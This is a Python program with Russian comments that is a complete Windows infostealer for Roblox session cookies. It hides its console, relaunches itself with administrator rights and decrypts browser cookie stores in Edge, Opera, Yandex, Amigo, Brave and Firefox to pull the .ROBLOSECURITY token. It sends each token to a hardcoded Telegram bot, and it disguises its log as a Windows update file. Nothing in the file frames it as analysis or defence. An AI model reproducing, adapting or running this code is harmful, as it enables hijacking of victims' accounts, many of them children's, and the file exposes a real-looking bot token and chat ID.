# Конфиг Telegram

import os
import sys
import sqlite3
import json
import requests
import base64
import ctypes
import subprocess
import time
from shutil import copy2
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt

# ===== КОНФИГУРАЦИЯ =====
TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
CHAT_ID = "1962231620"       # Замените на реальный Chat ID
LOG_FILE = os.path.join(os.getenv("TEMP"), "windows_update.log")
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"

def is_admin():
    """Проверка прав администратора"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_as_admin():
    """Перезапуск с правами администратора"""
    if sys.argv[0].endswith('.py'):
        executable = sys.executable
        params = sys.argv
    else:
        executable = sys.argv[0]
        params = []
    
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", executable, " ".join(params), None, 1
    )
    sys.exit(0)

def hide_console():
    """Скрытие консольного окна"""
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)  # 0 = SW_HIDE

def log_error(message):
    """Логирование ошибок"""
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

def decrypt_key(encrypted_key):
    """Расшифровка ключа браузера"""
    try:
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]  # Удалить префикс DPAPI
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        log_error(f"Key decryption failed: {str(e)}")
        return None

def decrypt_cookie(cookie, key):
    """Расшифровка куки"""
    try:
        iv = cookie[3:15]
        payload = cookie[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(payload)[:-16].decode()
    except Exception as e:
        log_error(f"Cookie decryption failed: {str(e)}")
        return None

def get_chromium_cookies(browser_path):
    """Получение кук из Chromium-браузеров"""
    cookies = []
    try:
        # Проверка существования путей
        cookies_path = os.path.join(browser_path, "Network", "Cookies")
        local_state_path = os.path.join(browser_path, "Local State")
        
        if not os.path.exists(cookies_path) or not os.path.exists(local_state_path):
            return []
        
        # Создание временных файлов
        temp_cookie = os.path.join(os.getenv("TEMP"), f"cookies_{os.getpid()}")
        temp_local_state = os.path.join(os.getenv("TEMP"), f"local_state_{os.getpid()}")
        
        copy2(cookies_path, temp_cookie)
        copy2(local_state_path, temp_local_state)

        # Получение ключа шифрования
        with open(temp_local_state, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        
        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        key = decrypt_key(encrypted_key)
        if not key:
            return []

        # Поиск куки Roblox
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT name, encrypted_value 
            FROM cookies 
            WHERE host_key LIKE '%.roblox.com' 
            AND name = '.ROBLOSECURITY'
        """)
        
        for name, encrypted_val in cursor.fetchall():
            if encrypted_val.startswith(b'v10'):  # Проверка версии шифрования
                decrypted = decrypt_cookie(encrypted_val, key)
                if decrypted: 
                    cookies.append(decrypted)
        
        conn.close()
        os.unlink(temp_cookie)
        os.unlink(temp_local_state)
    except Exception as e:
        log_error(f"Chromium error ({browser_path}): {str(e)}")
    return cookies

def get_firefox_cookies(profile_path):
    """Получение кук из Firefox"""
    cookies = []
    try:
        cookies_path = os.path.join(profile_path, "cookies.sqlite")
        if not os.path.exists(cookies_path):
            return []
        
        temp_db = os.path.join(os.getenv("TEMP"), f"cookies_{os.getpid()}.sqlite")
        copy2(cookies_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT value 
            FROM moz_cookies 
            WHERE host LIKE '%.roblox.com' 
            AND name = '.ROBLOSECURITY'
        """)
        cookies = [row[0] for row in cursor.fetchall()]
        conn.close()
        os.unlink(temp_db)
    except Exception as e:
        log_error(f"Firefox error ({profile_path}): {str(e)}")
    return cookies

def send_to_telegram(cookie):
    """Отправка куки в Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        headers = {"User-Agent": USER_AGENT}
        data = {"chat_id": CHAT_ID, "text": f"ROBLOSECURITY: {cookie}"}
        requests.post(url, data=data, headers=headers, timeout=15)
    except Exception as e:
        log_error(f"Telegram send failed: {str(e)}")

def install_dependencies():
    """Установка необходимых библиотек"""
    try:
        subprocess.check_call([
            sys.executable, "-m", "pip", "install", 
            "pycryptodome", "requests", "pywin32", "--quiet", "--disable-pip-version-check"
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except Exception as e:
        log_error(f"Install failed: {str(e)}")
        return False

def main():
    """Основная функция"""
    hide_console()  # Скрываем консоль сразу
    
    # Установка зависимостей при первом запуске
    try:
        import pycryptodome
        import win32crypt
    except ImportError:
        log_error("Установка зависимостей...")
        if not install_dependencies():
            log_error("Ошибка установки зависимостей")
            return
    
    # Проверка прав администратора
    if not is_admin():
        log_error("Требуются права администратора")
        run_as_admin()
        return
    
    log_error("===== Запуск системы обновления =====")
    
    # Пути к браузерам
    browsers = {
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
        "Amigo": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    # Поиск кук
    found_cookies = set()
    for name, path in browsers.items():
        log_error(f"Проверка {name}...")
        if name == "Firefox":
            if os.path.exists(path):
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile)
                    if os.path.isdir(profile_path):
                        cookies = get_firefox_cookies(profile_path)
                        if cookies:
                            found_cookies.update(cookies)
                            log_error(f"Найдено в Firefox: {len(cookies)} кук")
        elif os.path.exists(path):
            cookies = get_chromium_cookies(path)
            if cookies:
                found_cookies.update(cookies)
                log_error(f"Найдено в {name}: {len(cookies)} кук")

    # Отправка результатов
    if found_cookies:
        for cookie in found_cookies:
            send_to_telegram(cookie)
        log_error(f"Отправлено {len(found_cookies)} кук")
    else:
        log_error("Куки не найдены")

    # Сохранение в системе
    time.sleep(10)
    log_error("Операция завершена")

if __name__ == "__main__":
    # Защита от мультизапуска
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\ROBLOX_STEALER_MUTEX")
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)
        
    main()
    ctypes.windll.kernel32.CloseHandle(mutex)
